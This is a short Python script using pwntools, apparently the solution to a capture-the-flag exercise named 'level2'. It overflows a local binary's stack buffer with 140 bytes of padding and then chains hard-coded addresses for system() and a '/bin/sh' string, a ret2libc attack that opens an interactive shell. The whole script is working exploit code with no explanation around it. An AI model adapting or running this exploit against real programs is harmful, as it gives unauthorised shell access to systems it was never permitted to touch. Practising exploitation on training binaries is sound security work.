#!/usr/bin/env python

from pwn import *

p = process('../bin/level2')

ret = 0xdeedbeef
system_addr = 0xf7e46310
libc_addr = 0xf7e1fa00
binsh_addr = 0xf7f68cec

payload = 'A'*140 + p32(system_addr) + p32(ret) + p32(binsh_addr)

p.send(payload)

p.interactive()

